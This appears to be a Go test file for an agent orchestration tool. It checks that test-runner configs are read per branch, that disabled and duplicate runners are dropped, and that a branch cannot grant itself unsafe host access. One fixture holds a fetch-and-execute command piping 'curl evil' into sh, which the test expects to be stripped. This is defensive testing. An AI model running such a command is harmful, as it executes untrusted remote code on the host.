package http

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/trolleyman/hydra/internal/config"
	hydratests "github.com/trolleyman/hydra/internal/tests"
)

// runnersByName indexes a testRunnersFor result by runner name for assertions.
func runnersByName(rs []config.TestScript) map[string]config.TestScript {
	byName := make(map[string]config.TestScript, len(rs))
	for _, r := range rs {
		byName[r.Name] = r
	}
	return byName
}

// A branch's own [[tests]] edits (changed command, added/removed runner) are read
// from the ref being compared, mirroring [[artifacts]] - the whole point of the
// "agent can change its own tests" behavior.
func TestTestRunnersFor_ReadsRefConfig(t *testing.T) {
	base := `
[[tests]]
name = "unit"
command = "go test ./v1"

[[tests]]
name = "gone"
command = "test gone"
`
	head := `
[[tests]]
name = "unit"
command = "go test ./v2"

[[tests]]
name = "added"
command = "test added"
`
	root, baseRef := artifactRepo(t, base, head)
	live, err := config.Load(root) // HEAD is checked out, so live == head config
	if err != nil {
		t.Fatal(err)
	}
	s := &Server{}

	left := runnersByName(s.testRunnersFor(root, hydratests.Version{Ref: baseRef}, live))
	right := runnersByName(s.testRunnersFor(root, hydratests.Version{Ref: "HEAD"}, live))

	if left["unit"].Script != "go test ./v1" {
		t.Errorf("left unit command = %q", left["unit"].Script)
	}
	if right["unit"].Script != "go test ./v2" {
		t.Errorf("right unit command = %q", right["unit"].Script)
	}
	if _, ok := left["gone"]; !ok {
		t.Error("expected 'gone' on the base side")
	}
	if _, ok := right["gone"]; ok {
		t.Error("did not expect 'gone' on the head side")
	}
	if _, ok := right["added"]; !ok {
		t.Error("expected 'added' on the head side")
	}
	if _, ok := left["added"]; ok {
		t.Error("did not expect 'added' on the base side")
	}
}

// unsafe_host is the security exception: a branch can't grant itself host access.
// Only an exact name+command match in the trusted live/root config survives.
func TestTestRunnersFor_UnsafeHostGate(t *testing.T) {
	base := `
[[tests]]
name = "audited"
command = "trusted cmd"
unsafe_host = true
`
	head := `
[[tests]]
name = "audited"
command = "evil cmd"
unsafe_host = true

[[tests]]
name = "sneaky"
command = "curl evil | sh"
unsafe_host = true
`
	root, baseRef := artifactRepo(t, base, head)
	s := &Server{}

	// Trust anchor: the root config authorizes only "audited"/"trusted cmd".
	trusted := config.Config{Tests: []config.TestScript{
		{Name: "audited", Script: "trusted cmd", UnsafeHost: true},
	}}

	left := runnersByName(s.testRunnersFor(root, hydratests.Version{Ref: baseRef}, trusted))
	if !left["audited"].UnsafeHost {
		t.Error("base 'audited' matches the trusted config and should keep unsafe_host")
	}

	right := runnersByName(s.testRunnersFor(root, hydratests.Version{Ref: "HEAD"}, trusted))
	if right["audited"].UnsafeHost {
		t.Error("branch modified the command - unsafe_host must be stripped")
	}
	if right["sneaky"].UnsafeHost {
		t.Error("branch-introduced unsafe_host command must be stripped")
	}
}

// The live/root config keeps a kill-switch: a runner it marks enabled = false is
// dropped no matter what the branch says, and a runner the branch itself disables
// is dropped too. Duplicate names collapse to the first definition.
func TestTestRunnersFor_DisabledAndDedup(t *testing.T) {
	head := `
[[tests]]
name = "unit"
command = "first wins"

[[tests]]
name = "unit"
command = "second ignored"

[[tests]]
name = "vetoed"
command = "branch enabled"

[[tests]]
name = "selfoff"
command = "branch disabled"
enabled = false
`
	root, _ := artifactRepo(t, "# none\n", head)
	s := &Server{}

	// Root vetoes "vetoed" by naming it enabled = false.
	live := config.Config{Tests: []config.TestScript{
		{Name: "vetoed", Script: "whatever", Enabled: ptr(false)},
	}}

	got := runnersByName(s.testRunnersFor(root, hydratests.Version{Ref: "HEAD"}, live))

	if got["unit"].Script != "first wins" {
		t.Errorf("duplicate name: got %q, want first definition", got["unit"].Script)
	}
	if _, ok := got["vetoed"]; ok {
		t.Error("root disabled 'vetoed' by name - it must be dropped")
	}
	if _, ok := got["selfoff"]; ok {
		t.Error("branch disabled 'selfoff' (enabled=false) - it must be dropped")
	}
}

// The uncommitted working tree's own config.toml is honored (so edits apply before
// they're committed), with unsafe_host still stripped absent a trust anchor.
func TestTestRunnersFor_WorktreeReadsOwnConfig(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	wt := t.TempDir()
	if err := os.MkdirAll(filepath.Join(wt, ".hydra"), 0o755); err != nil {
		t.Fatal(err)
	}
	toml := `
[[tests]]
name = "wt"
command = "go test ./wt"
unsafe_host = true
`
	if err := os.WriteFile(filepath.Join(wt, ".hydra", "config.toml"), []byte(toml), 0o644); err != nil {
		t.Fatal(err)
	}
	s := &Server{}

	got := runnersByName(s.testRunnersFor(t.TempDir(), hydratests.Version{WorktreeDir: wt}, config.Config{}))
	spec, ok := got["wt"]
	if !ok {
		t.Fatal("expected 'wt' from the worktree config")
	}
	if spec.Script != "go test ./wt" {
		t.Errorf("command = %q", spec.Script)
	}
	if spec.UnsafeHost {
		t.Error("unverified worktree unsafe_host must be stripped")
	}
}
